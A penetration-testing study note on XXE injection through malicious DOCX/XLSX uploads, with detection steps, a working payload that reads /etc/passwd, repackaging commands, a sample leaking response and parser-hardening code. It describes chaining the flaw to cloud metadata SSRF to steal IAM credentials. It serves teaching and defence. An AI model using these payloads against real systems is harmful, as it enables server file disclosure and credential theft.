---
tags: [vapt, file-upload, xxe, intermediate]
difficulty: intermediate
module: "22 - File Upload"
topic: "22.10 File Upload + XXE (malicious DOCX/XLSX)"
---

# 22.10 — File Upload + XXE (Malicious DOCX/XLSX)

## What is it?
Modern Office documents (like `.docx`, `.xlsx`, and `.pptx`) are actually just ZIP archives containing many XML files. If an application accepts these documents and parses their contents (for example, generating a document preview, extracting text for a search index, or parsing data from a spreadsheet), the underlying XML parser might be vulnerable to XML External Entity (XXE) injection. 

By unzipping a legitimate document, injecting a malicious XXE payload into one of the internal XML files (like `[Content_Types].xml` or `word/document.xml`), and repackaging it, an attacker can trick the server's XML parser into reading local files on the server (like `/etc/passwd`), performing Server-Side Request Forgery (SSRF), or establishing an out-of-band (OOB) connection back to the attacker.

Think of an Office document like a sealed envelope containing a letter. The application expects a standard letter, but the attacker has written instructions on the letter saying "Before reading further, go fetch the top-secret file from the boss's desk and read it to me." If the reader (the XML parser) blindly follows instructions, they get compromised.

## ASCII Diagram
```text
[Attacker] 
   │ 
   │ 1. Unzips DOCX, injects XXE into [Content_Types].xml, rezips
   ▼
[Uploads malicious.docx] ───────┐
                                │
[Web Application]               │
   │                            │
   │ 2. Accepts file            ▼
   │ 3. Parses XML ────────> [XML Parser]
   │                              │
   │                              │ 4. Resolves <!ENTITY xxe SYSTEM "file:///etc/passwd">
   │                              ▼
   │                        [Local Filesystem]
   │                              │
   │ 5. Embeds file content       │
   │    into parsed output <──────┘
   │
   ▼
[Returns file preview or error containing /etc/passwd]
```

## How to Find It
- **Manual steps:**
  1. Identify upload features that accept Office documents (e.g., CV uploads, invoice processors, template generation).
  2. Create a malicious `.docx` or `.xlsx` file containing an XXE payload that triggers a DNS or HTTP lookup to an Out-of-Band (OOB) server like Burp Collaborator.
  3. Upload the file and monitor your OOB server for incoming connections. If you get a ping, the parser is vulnerable.
  4. If you get a hit, try extracting a local file like `/etc/passwd` and check if it reflects in the application's response (e.g., in a document preview or error message).

- **Tool commands with flags explained:**
  Using Python to quickly spin up a listener for OOB testing:
  ```bash
  # Start a local HTTP server on port 8888 to catch incoming connections
  python3 -m http.server 8888
  ```

## How to Exploit It
- **Step-by-step walkthrough:**
  1. Create a legitimate DOCX file (e.g., `template.docx`) and unzip it: `unzip template.docx -d malicious_docx/`.
  2. Edit one of the core XML files, such as `[Content_Types].xml` or `word/document.xml`.
  3. Add an XML `DOCTYPE` declaration defining an external entity pointing to a local file.
  4. Reference the entity (`&xxe;`) somewhere inside the XML body.
  5. Repackage the directory back into a ZIP file using the `.docx` extension.
  6. Upload the file and observe the response or monitor for OOB interactions.

- **Actual payloads:**
  **Payload injected into `[Content_Types].xml`:**
  ```xml
  <?xml version="1.0" encoding="UTF-8" standalone="yes"?>
  <!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
  ]>
  <Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
    &xxe;
    <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
    <Default Extension="xml" ContentType="application/xml"/>
  </Types>
  ```
  **Repackaging command:**
  ```bash
  cd malicious_docx
  zip -r ../malicious.docx . -x "*.DS_Store"
  ```

- **Real HTTP request/response examples:**
  **Upload Request:**
  ```http
  POST /api/upload-invoice HTTP/1.1
  Host: target.com
  Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

  ------WebKitFormBoundary
  Content-Disposition: form-data; name="invoice_file"; filename="malicious.xlsx"
  Content-Type: application/vnd.openxmlformats-officedocument.spreadsheetml.sheet

  PK\x03\x04... [Binary data containing XXE-injected [Content_Types].xml] ...
  ------WebKitFormBoundary--
  ```
  **Response (Reflected XXE):**
  ```http
  HTTP/1.1 500 Internal Server Error
  
  Error parsing invoice data. Unrecognized content type: root:x:0:0:root:/root:/bin/bash
  daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
  ...
  ```

## Real-World Example
In a bug bounty program, a researcher found an application that allowed users to upload CVs in `.docx` format, which were then converted into PDFs for recruiters to view. The researcher unzipped a blank DOCX, injected a blind OOB XXE payload into `word/document.xml`, and zipped it back up. When the server processed the file to generate the PDF, the XML parser reached out to the researcher's external server, confirming the vulnerability. The researcher then upgraded the payload to extract AWS IAM credentials from the local metadata service (`http://169.254.169.254/latest/meta-data/iam/security-credentials/`), leading to full cloud infrastructure compromise.

## How to Fix It
- **Developer remediation:**
  The root cause is an insecurely configured XML parser processing the unzipped files. You must explicitly disable External Entity processing (XXE) and DTDs in the XML parsing library used by your application. Relying strictly on safe document parsing libraries that disable these features by default is recommended.

- **Code snippet:**
  **Java (Apache POI or JAXP):**
  ```java
  // Explicitly disable external entities
  XMLInputFactory factory = XMLInputFactory.newInstance();
  factory.setProperty(XMLInputFactory.SUPPORT_DTD, false);
  factory.setProperty(XMLInputFactory.IS_SUPPORTING_EXTERNAL_ENTITIES, false);
  ```

  **Python (Using defusedxml instead of lxml):**
  ```python
  # Standard xml or lxml is vulnerable to XXE
  # Instead, use defusedxml which safely blocks external entities
  import defusedxml.ElementTree as ET
  
  # Parsing the unzipped XML safely
  tree = ET.parse('extracted_docx/[Content_Types].xml')
  ```

## Chaining Opportunities
- This vuln + [[Cloud Infrastructure (AWS, GCP, Azure)]] → If the application is hosted in the cloud, use XXE to perform SSRF against the cloud instance metadata service (`http://169.254.169.254/`) to steal temporary IAM credentials.
- This vuln + [[Blind Out-of-Band (OOB) Techniques]] → If the output of the file (`/etc/passwd`) is never displayed to the user, chain the XXE with an OOB technique (using an external DTD) to exfiltrate the file contents over HTTP or DNS.

## Related Notes
- [[14 - XXE — What is XXE]]
- [[08 - File Upload + SSRF (SVG with SSRF payload)]]
- [[15 - Defense — Extension Allowlists, Content Validation, Separate Storage]]
